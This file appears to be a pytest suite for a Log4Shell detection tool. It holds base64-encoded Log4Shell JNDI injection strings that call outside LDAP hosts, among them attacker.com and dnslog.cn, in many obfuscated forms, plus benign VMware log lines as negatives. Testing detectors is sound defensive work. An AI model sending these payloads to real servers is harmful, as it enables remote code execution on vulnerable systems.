import sys, os
import importlib
import base64
import gzip
_std_supported = False
try:
    import zstandard
    _std_supported = True
except ImportError:
    print("[!] No support for zstandared files without 'zstandard' libary")
sys.path.append(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir))
from Log4ShellDetector import Log4ShellDetector

TEST_FILE_NAME = "temp-test-file.log"

TEST_STRINGS_POSITIVE = [
    "aHR0cC1uaW8tODAtZXhlYy0xMyBXQVJOIEVycm9yIGxvb2tpbmcgdXAgSk5ESSByZXNvdXJjZSBbbGRhcDovLzE5Mi4xNjguMS4xNToxMzM3L2VdLiBqYXZheC5uYW1pbmcuTmFtaW5nRXhjZXB0aW9uIFtSb290IGV4Y2VwdGlvbiBpcyBqYXZhLmxhbmcuQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbjogb3JnLmFwYWNoZS5jb21tb25zLmJlYW51dGlscy5CZWFuQ29tcGFyYXRvcl07IHJlbWFpbmluZyBuYW1lICdlJwoJYXQgamF2YS5uYW1pbmcvY29tLnN1bi5qbmRpLmxkYXAuT2JqLmRlc2VyaWFsaXplT2JqZWN0KE9iai5qYXZhOjUzMSkKCWF0IGphdmEubmFtaW5nL2NvbS5zdW4uam5kaS5sZGFwLk9iai5kZWNvZGVPYmplY3QoT2JqLmphdmE6MjM3KQoJYXQgamF2YS5uYW1pbmcvY29tLnN1bi5qbmRpLmxkYXAuTGRhcEN0eC5jX2xvb2t1cChMZGFwQ3R4LmphdmE6MTA1MSkKCWF0IGphdmEubmFtaW5nL2NvbS5zdW4uam5kaS50b29sa2l0LmN0eC5Db21wb25lbnRDb250ZXh0LnBfbG9va3VwKENvbXBvbmVudENvbnRleHQuamF2YTo1NDIpCglhdCBqYXZhLm5hbWluZy9jb20uc3VuLmpuZGkudG9vbGtpdC5jdHguUGFydGlhbENvbXBvc2l0ZUNvbnRleHQubG9va3VwKFBhcnRpYWxDb21wb3NpdGVDb250ZXh0LmphdmE6MTc3KQoJYXQgamF2YS5uYW1pbmcvY29tLnN1bi5qbmRpLnRvb2xraXQudXJsLkdlbmVyaWNVUkxDb250ZXh0Lmxvb2t1cChHZW5lcmljVVJMQ29udGV4dC5qYXZhOjIwNykKCWF0IGphdmEubmFtaW5nL2NvbS5zdW4uam5kaS51cmwubGRhcC5sZGFwVVJMQ29udGV4dC5sb29rdXAobGRhcFVSTENvbnRleHQuamF2YTo5NCkKCWF0IGphdmEubmFtaW5nL2phdmF4Lm5hbWluZy5Jbml0aWFsQ29udGV4dC5sb29rdXAoSW5pdGlhbENvbnRleHQuamF2YTo0MDkpCglhdCBvcmcuYXBhY2hlLmxvZ2dpbmcubG9nNGouY29yZS5uZXQuSm5kaU1hbmFnZXIubG9va3VwKEpuZGlNYW5hZ2VyLmphdmE6MTI4KQoJYXQgb3JnLmFwYWNoZS5sb2dnaW5nLmxvZzRqLmNvcmUubG9va3VwLkpuZGlMb29rdXAubG9va3VwKEpuZGlMb29rdXAuamF2YTo1NSkKCWF0IG9yZy5hcGFjaGUubG9nZ2luZy5sb2c0ai5jb3JlLmxvb2t1cC5JbnRlcnBvbGF0b3IubG9va3VwKEludGVycG9sYXRvci5qYXZhOjE1OSkKCWF0IG9yZy5hcGFjaGUubG9nZ2luZy5sb2c0ai5jb3JlLmxvb2t1cC5TdHJTdWJzdGl0dXRvci5yZXNvbHZlVmFyaWFibGUoU3RyU3Vic3RpdHV0b3IuamF2YToxMDQ2KQoJLi4u",
    "MjAyMS0xMi0xMSBbTXlBcHBdIC0gQ29udGFpbnMgJHske2VudjpCQVJGT086LWp9bmRpJHtlbnY6QkFSRk9POi06fSR7ZW52OkJBUkZPTzotbH1kYXAke2VudjpCQVJGT086LTp9Ly9hdHRhY2tlci5jb20vYX0=",
    "MjAyMS0xMi0xMSBbTXlBcHBdIC0gQ29udGFpbnMgJHtqTmRJOmxkQXA6Ly90ajV1ZGcuZG5zbG9nLmNufQ==",
    "MjAyMS0xMi0xMSBbTXlBcHBdIC0gQ29udGFpbnMgJHtqbmRpOmxkYXA6Ly9zcGZjYmYke2xvd2VyOi59ZG5zbG9nJHtsb3dlcjoufWNufQ==",
    "MjAyMS0xMi0xMSBbTXlBcHBdIC0gQ29udGFpbnMgJHtqbmRpOmxkYXA6Ly90ajV1ZGcuZG5zbG9nLmNufQ==",
    "MjAyMS0xMi0xMSBbTXlBcHBdIC0gQ29udGFpbnMgJCU3QmpuZGk6bGRhcDovL3RqNXVkZy5kbnNsb2cuY24lN0Q=",
    "MjAyMS0xMi0xMSBbTXlBcHBdIC0gQ29udGFpbnMgJTI0JTI1N0JqbmRpJTNBbGRhcCUzQSUyRiUyRnRqNXVkZyUyRWRuc2xvZyUyRWNuJTI1N0Q=",
    "MjAyMS0xMi0xMSBbTXlBcHBdIC0gQ29udGFpbnMgJTI1MjQlMjUyNTdCam5kaSUyNTNBbGRhcCUyNTNBJTI1MkYlMjUyRnRqNXVkZyUyNTJFZG5zbG9nJTI1MkVjbiUyNTI1N0Q=",
    "JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTA5OS9vYmp9",
    "JHske3VwcGVyOmp9biR7bG93ZXI6ZH0ke2xvd2VyOml9Omwke2xvd2VyOmR9JHtsb3dlcjphfSR7bG93ZXI6cH0ke2xvd2VyOjp9JHtsb3dlcjovfSR7bG93ZXI6L30xJHtsb3dlcjoyfSR7bG93ZXI6N30uMCR7bG93ZXI6Ln0wJHtsb3dlcjoufSR7bG93ZXI6MX0ke2xvd2VyOjp9MTAke2xvd2VyOjl9OSR7bG93ZXI6L31vJHtsb3dlcjpifWp9Cg==",
    "JHske3VwcGVyOmp9JHtsb3dlcjpufSR7bG93ZXI6ZH0ke2xvd2VyOml9JHtsb3dlcjo6fSR7bG93ZXI6bH0ke2xvd2VyOmR9JHtsb3dlcjphfSR7bG93ZXI6cH0ke2xvd2VyOjp9JHtsb3dlcjovfSR7bG93ZXI6L30ke2xvd2VyOjF9JHtsb3dlcjoyfSR7bG93ZXI6N30ke2xvd2VyOi59JHtsb3dlcjowfSR7bG93ZXI6Ln0ke2xvd2VyOjB9JHtsb3dlcjoufSR7bG93ZXI6MX0ke2xvd2VyOjp9JHtsb3dlcjoxfSR7bG93ZXI6MH0ke2xvd2VyOjl9JHtsb3dlcjo5fSR7bG93ZXI6L30ke2xvd2VyOm99JHtsb3dlcjpifSR7bG93ZXI6an19Cg==",
    "JHtqbmRpOmxkJHtvekk6S2doOlFuOlRYTTotYX1wOiR7REJFYXU6WTpwTFhVdTpTZlJLazp2V3U6LS99JHt4OlVNQURxOi0vfTEyNyR7bHQ6dFdkOmlFVlc6cEQ6dEdDcjotLn0ke2pGcFNEVzp6OlNOOkF1cU06QzotMH0ke2R4eGlsYzpIVEZhOlFMZ2lpOnB2Oi0ufTAuJHthOmw6dXJucnRrOi0xfToxMDk5JHt6bFNFcVE6VDpxZzpvOi0vfW9iJHtFOnlKRHNicTotan19Cg=="
    "JHske2VoOndEVWRvczpqS1k6LWp9JHt4a3NWOlhnaTotbn0ke2hOZGI6U2JtWFU6Z29XZ3ZKOmlxQVY6VXg6LWR9JHtNWFdOOm9PaTpjOlV4WHpjSTotaX0ke0RZS2dzOnRIbFk6LTp9JHtkOkZIZE1tOmZ3Oi1sfSR7R3c6LWR9JHtMZWJHeGU6YzpTeExYYTotYX0ke2VjaHlXYzpCRTpOQk86czpnVmJUOi1wfSR7bDpRd0NMOmd6T1FtOmdxc0RTOi06fSR7cU16dExuOmU6RTpXUzotL30ke05VdTpTOmFmVk5iVDpreWpiaUU6LS99JHtQdEdVZkk6V2NZaDpjOi0xfSR7WW9TSjpLVVY6dXlTSzpjck5UbTotMn0ke0V3a1k6RXNYOlM6d2s6LTd9JHtIVVdPSjpNTUl4T246UzotLn0ke01IRjpzOi0wfSR7b2JySlZVOlJQdzpkOkE6LS59JHtFOlJnWTpqOi0wfSR7TWFPdGJNOi0ufSR7TzotMX0ke3p6ZnVHRDpZRXl2eTptaHA6VDotOn0ke3ZsYXc6V3VPQno6LTF9JHtIQWp4dDp6aUJnbWM6LTB9JHtVS1ZCcms6c05BS2U6RjpxWE5ldFE6bWRJdU9XOi05fSR7Z2VKczpzZ1lnUVc6b09kOnFPR2Y6YVlwQWtQOi05fSR7VW9uSU52Oi0vfSR7YVR5Z0hLOnBiUWlUQjpLa1hoS1M6LW99JHtGTVJBS006LWJ9JHt3aXU6dktJVnVoOi1qfX0K",
    # Base64 pattern
    "JHske2Jhc2U2NDpKSHRxYm1ScE9teGtZWEE2WVdSa2NuMD19fQ==",
]

TEST_STRINGS_POSITIVE_GZ = [
    "H4sICMHltGEAA3Rlc3QtbG9nLWhlYXZ5LW9iZnVzYy5sb2cAMzIwMtQ1NNI1NFSI9q10LCiIVdBVcM7PK0nMzCtWUKlWqU7NK7Nycgxy8/e30s2qzUvJRBWyqkXl59SmJBagK9HXTywpSUzOTi3SS87P1U+sBQAxghl7dwAAAA=="
]

TEST_STRINGS_POSITIVE_ZSTD = [
    "KLUv/SR3xQIA1AQyMDIxLTEyLTExIFtNeUFwcF0gLSBDb250YWlucyAkeyR7ZW52OkJBUkZPTzotan1uZGk6fWx9ZGFwOn0vL2F0dGFja2VyLmNvbS9hfQMUBAumB49BATOSzGQ="
]

TEST_STRINGS_NEGATIVE = [
    "MjAyMSAxMDowODozNSBBVVJPUkE6IFdhcm5pbmcgTU9EVUxFOiBBdXJvcmEtQWdlbnQgVE9LRU5FTEVWQVRJT05UWVBFOiAlJTE5MzggVkVSU0lPTjogMgo=",
    "MjAyMS0wMy0xMlQwMDoxMjoxMC44NjFaIFsnIyBpbnZzdmMgY2lzcmVnIHByb3BzXG4nLCAnc29sdXRpb25Vc2VyLm5hbWUgPSAke3NvbHV0aW9uLXVzZXIubmFtZX1cbicsICdzb2x1dGlvblVzZXIub3duZXJJZCA9ICR7c29sdXRpb24tdXNlci5uYW1lfUAke3ZtZGlyLmRvbWFpbi1uYW1lfVxuJywgJ2NtcmVnLnNlcnZpY2VpZCA9ICR7aW52c3ZjLnNlcnZpY2UtaWR9XG4nLCAnIyBpbnZzdmMgcmVnaXN0cmF0aW9uIHNwZWMgcHJvcGVydGllc1xuJywgJ3NlcnZpY2VWZXJzaW9uID0gMS4wXG4nLCAnb3duZXJJZCA9ICR7c29sdXRpb24tdXNlci5uYW1lfUAke3ZtZGlyLmRvbWFpbi1uYW1lfVxuJywgJ3NlcnZpY2VUeXBlLnByb2R1Y3QgPSBjb20udm13YXJlLmNpc1xuJywgJ3NlcnZpY2VUeXBlLnR5cGUgPSBjcy5pbnZlbnRvcnlcbicsICdzZXJ2aWNlTmFtZVJlc291cmNlS2V5ID0gY3MuaW52ZW50b3J5LlNlcnZpY2VOYW1lXG4nLCAnc2VydmljZURlc2NyaXB0aW9uUmVzb3VyY2VLZXkgPSBjcy5pbnZlbnRvcnkuU2VydmljZURlc2NyaXB0aW9uXG4nLCAnc2VydmljZUdyb3VwUmVzb3VyY2VLZXkgPSBjcy5pbnZlbnRvcnkuc2VydmljZWdyb3VwcmVzb3VyY2VcbicsICdzZXJ2aWNlR3JvdXBJbnRlcm5hbElkID0gY3NcbicsICdjb250cm9sU2NyaXB0UGF0aCA9ICR7Y29udHJvbHNjcmlwdC5wYXRofVxuJywgJ2hvc3RJZCA9ICR7c2NhLmhvc3RpZH1cbicsICdlbmRwb2ludDAudXJsID0gaHR0cHM6Ly8ke3N5c3RlbS51cmxob3N0bmFtZX06JHtyaHR0cHByb3h5LmV4dC5wb3J0Mn0vaW52c3ZjXG4nLCAnZW5kcG9pbnQwLnR5cGUucHJvdG9jb2wgPSBodHRwXG4nLCAnZW5kcG9pbnQwLnR5cGUuaWQgPSBjb20udm13YXJlLmNpcy5pbnZlbnRvcnlcbicsICdlbmRwb2ludDEudXJsID0gaHR0cHM6Ly8ke3N5c3RlbS51cmxob3N0bmFtZX06JHtyaHR0cHByb3h5LmV4dC5wb3J0Mn0vaW52c3ZjL3Ztb21pL3Nka1xuJywgJ2VuZHBvaW50MS50eXBlLnByb3RvY29sID0gdm1vbWlcbicsICdlbmRwb2ludDEudHlwZS5pZCA9IGNvbS52bXdhcmUuY2lzLmludmVudG9yeS5zZXJ2ZXJcbicsICdlbmRwb2ludDIudXJsID0gaHR0cHM6Ly8ke3N5c3RlbS51cmxob3N0bmFtZX06JHtyaHR0cHByb3h5LmV4dC5wb3J0Mn0vaW52c3ZjL3Ztb21pL3Nka1xuJywgJ2VuZHBvaW50Mi50eXBlLnByb3RvY29sID0gdm1vbWlcbicsICdlbmRwb2ludDIudHlwZS5pZCA9IGNvbS52bXdhcmUuY2lzLnRhZ2dpbmcuc2VydmVyXG4nLCAnZW5kcG9pbnQzLnVybCA9IGh0dHBzOi8vJHtzeXN0ZW0udXJsaG9zdG5hbWV9OiR7cmh0dHBwcm94eS5leHQucG9ydDJ9L2ludnN2Yy92YXBpXG4nLCAnZW5kcG9pbnQzLnR5cGUucHJvdG9jb2wgPSB2YXBpLmpzb24uaHR0cHNcbicsICdlbmRwb2ludDMudHlwZS5pZCA9IGNvbS52bXdhcmUuY2lzLmludmVudG9yeS52YXBpXG4nLCAnZW5kcG9pbnQzLmRhdGEwLmtleSA9IGNvbS52bXdhcmUudmFwaS5tZXRhZGF0YS5tZXRhbW9kZWwuZmlsZS5hdXRoelxuJywgJ2VuZHBvaW50My5kYXRhMC52YWx1ZSA9IC91c3IvbGliL3Ztd2FyZS12cHhkLXN2Y3MvdmFwaS1tZXRhZGF0YS9hdXRoei9hdXRoel9tZXRhbW9kZWwuanNvblxuJywgJ2VuZHBvaW50My5kYXRhMS5rZXkgPSBjb20udm13YXJlLnZhcGkubWV0YWRhdGEuYXV0aGVudGljYXRpb24uZmlsZS5hdXRoelxuJywgJ2VuZHBvaW50My5kYXRhMS52YWx1ZSA9IC91c3IvbGliL3Ztd2FyZS12cHhkLXN2Y3MvdmFwaS1tZXRhZGF0YS9hdXRoei9hdXRoel9hdXRoZW50aWNhdGlvbi5qc29uXG4nLCAnZW5kcG9pbnQzLmRhdGEyLmtleSA9IGNvbS52bXdhcmUudmFwaS5tZXRhZGF0YS5yb3V0aW5nLmZpbGUuYXV0aHpcbicsICdlbmRwb2ludDMuZGF0YTIudmFsdWUgPSAvdXNyL2xpYi92bXdhcmUtdnB4ZC1zdmNzL3ZhcGktbWV0YWRhdGEvYXV0aHovYXV0aHpfcm91dGluZy5qc29uXG4nLCAnZW5kcG9pbnQzLmRhdGEzLmtleSA9IGNvbS52bXdhcmUudmFwaS5tZXRhZGF0YS5tZXRhbW9kZWwuZmlsZS50YWdnaW5nXG4nLCAnZW5kcG9pbnQzLmRhdGEzLnZhbHVlID0gL3Vzci9saWIvdm13YXJlLXZweGQtc3Zjcy92YXBpLW1ldGFkYXRhL3RhZ2dpbmcvY29tLnZtd2FyZS5jaXMudGFnZ2luZ19tZXRhbW9kZWwuanNvblxuJywgJ2VuZHBvaW50My5kYXRhNC5rZXkgPSBjb20udm13YXJlLnZhcGkubWV0YWRhdGEuYXV0aGVudGljYXRpb24uZmlsZS50YWdnaW5nXG4nLCAnZW5kcG9pbnQzLmRhdGE0LnZhbHVlID0gL3Vzci9saWIvdm13YXJlLXZweGQtc3Zjcy92YXBpLW1ldGFkYXRhL3RhZ2dpbmcvY29tLnZtd2FyZS5jaXMudGFnZ2luZ19hdXRoZW50aWNhdGlvbi5qc29uXG4nLCAnZW5kcG9pbnQzLmRhdGE1LmtleSA9IGNvbS52bXdhcmUudmFwaS5tZXRhZGF0YS5jbGkuZmlsZS50YWdnaW5nXG4nLCAnZW5kcG9pbnQzLmRhdGE1LnZhbHVlID0gL3Vzci9saWIvdm13YXJlLXZweGQtc3Zjcy92YXBpLW1ldGFkYXRhL3RhZ2dpbmcvY29tLnZtd2FyZS5jaXMudGFnZ2luZ19jbGkuanNvblxuJywgJ2VuZHBvaW50NC51cmwgPSBodHRwczovLyR7c3lzdGVtLnVybGhvc3RuYW1lfToke3JodHRwcHJveHkuZXh0LnBvcnQyfVxuJywgJ2VuZHBvaW50NC50eXBlLnByb3RvY29sID0gZ1JQQ1xuJywgJ2VuZHBvaW50NC50eXBlLmlkID0gdGFnZ2luZ1xuJywgJ2VuZHBvaW50NC5kYXRhMC5rZXkgPSBjaXMuY29tbW9uLmVwLmxvY2FsdXJsXG4nLCAnZW5kcG9pbnQ0LmRhdGEwLnZhbHVlID0gaHR0cDovL2xvY2FsaG9zdDojI3tUQUdHSU5HX0dSUENfUE9SVH0jI1xuJywgJ2F0dHJpYnV0ZTAua2V5ID0gU3luY2FibGVcbicsICdhdHRyaWJ1dGUwLnZhbHVlID0gRUxNLFNQT0dcbicsICdhdHRyaWJ1dGUxLmtleSA9IFN1YnNjcmliYWJsZVxuJywgJ2F0dHJpYnV0ZTEudmFsdWUgPSB0cnVlXG4nLCAnaGVhbHRoLnVybCA9IGh0dHBzOi8vJHtzeXN0ZW0udXJsaG9zdG5hbWV9OiR7cmh0dHBwcm94eS5leHQucG9ydDJ9L2ludnN2Yy9pbnZzdmMtaGVhbHRoXG4nLCAncmVzb3VyY2VidW5kbGUudXJsID0gaHR0cHM6Ly8ke3N5c3RlbS51cmxob3N0bmFtZX06JHtyaHR0cHByb3h5LmV4dC5wb3J0Mn0vaW52c3ZjL2ludnN2Yy1yZXNvdXJjZVxuJywgJ3Jlc291cmNlYnVuZGxlLmRhdGEwLmtleSA9IGNvbS52bXdhcmUuY2lzLmNvbW1vbi5yZXNvdXJjZWJ1bmRsZS5iYXNlbmFtZVxuJywgJ3Jlc291cmNlYnVuZGxlLmRhdGEwLnZhbHVlID0gY3MuaW52ZW50b3J5LlJlc291cmNlQnVuZGxlXG4nLCAnIyByZXZlcnNlIHByb3h5IGNvbmZpZ3VyYXRpb25cbicsICdyaHR0cHByb3h5LmZpbGUgPSBpbnZzdmMtcHJveHkuY29uZlxuJywgJ3JodHRwcHJveHkuZW5kcG9pbnQwLm5hbWVzcGFjZSA9IC9pbnZzdmNcbicsICdyaHR0cHByb3h5LmVuZHBvaW50MC5jb25uZWN0aW9uVHlwZSA9IGxvY2FsXG4nLCAncmh0dHBwcm94eS5lbmRwb2ludDAuYWRkcmVzcyA9ICR7dnB4ZC1zdmNzLmludC5odHRwfVxuJywgJ3JodHRwcHJveHkuZW5kcG9pbnQwLmh0dHBBY2Nlc3NNb2RlID0gcmVkaXJlY3RcbicsICdyaHR0cHByb3h5LmVuZHBvaW50MC5odHRwc0FjY2Vzc01vZGUgPSBhbGxvd1xuJ10=",
]


def test_positives_plain():
    for string_positive in TEST_STRINGS_POSITIVE:
        # Decode test string and write it to a temporary file
        with open(TEST_FILE_NAME, "wb") as fp:
            file_content = base64.b64decode(string_positive)
            fp.write(file_content)
        fp.close()
        # Run the test
        l4sd = Log4ShellDetector.detector(maximum_distance=40, debug=False, quick=False)
        detections = l4sd.scan_file(TEST_FILE_NAME)
        os.unlink(TEST_FILE_NAME)
        # Print some info on the failed test
        tested_string = file_content
        if isinstance(file_content, bytes):
            tested_string = file_content.decode('utf-8', 'ignore')
        if len(detections) < 1:
            print("[E] failed to detect payload in STRING: %s" % tested_string)
        assert len(detections) > 0


def test_positives_gz():
    for string_positive in TEST_STRINGS_POSITIVE_GZ:
        # Decode test string and write it to a temporary file
        with open(TEST_FILE_NAME, "wb") as fp:
            file_content = gzip.decompress(base64.b64decode(string_positive))
            fp.write(file_content)
        fp.close()
        # Run the test
        l4sd = Log4ShellDetector.detector(maximum_distance=40, debug=False, quick=False)
        detections = l4sd.scan_file(TEST_FILE_NAME)
        os.unlink(TEST_FILE_NAME)
        # Print some info on the failed test
        tested_string = file_content
        if isinstance(file_content, bytes):
            tested_string = file_content.decode('utf-8', 'ignore')
        if len(detections) < 1:
            print("[E] failed to detect payload in STRING: %s" % tested_string)
        assert len(detections) > 0


def test_positives_zstd():
    if not _std_supported:
        assert True
        return
    for string_positive in TEST_STRINGS_POSITIVE_GZ:
        # Decode test string and write it to a temporary file
        with open(TEST_FILE_NAME, "wb") as fp:
            file_content = gzip.decompress(base64.b64decode(string_positive))
            fp.write(file_content)
        fp.close()
        # Run the test
        l4sd = Log4ShellDetector.detector(maximum_distance=40, debug=False, quick=False)
        detections = l4sd.scan_file(TEST_FILE_NAME)
        os.unlink(TEST_FILE_NAME)
        # Print some info on the failed test
        tested_string = file_content
        if isinstance(file_content, bytes):
            tested_string = file_content.decode('utf-8', 'ignore')
        if len(detections) < 1:
            print("[E] failed to detect payload in STRING: %s" % tested_string)
        assert len(detections) > 0


def test_negatives_plain():
    for string_negative in TEST_STRINGS_NEGATIVE:
        # Decode test string and write it to a temporary file
        with open(TEST_FILE_NAME, "wb") as fp:
            file_content = base64.b64decode(string_negative)
            fp.write(file_content)
        fp.close()
        # Run the test
        l4sd = Log4ShellDetector.detector(maximum_distance=40, debug=False, quick=False)
        detections = l4sd.scan_file(TEST_FILE_NAME)
        os.unlink(TEST_FILE_NAME)
        # Print some info on the failed test
        tested_string = file_content
        if isinstance(file_content, bytes):
            tested_string = file_content.decode('utf-8', 'ignore')
        if len(detections) > 1:
            print("[E] detected payload in legitimate STRING: %s" % tested_string)
        assert len(detections) < 1
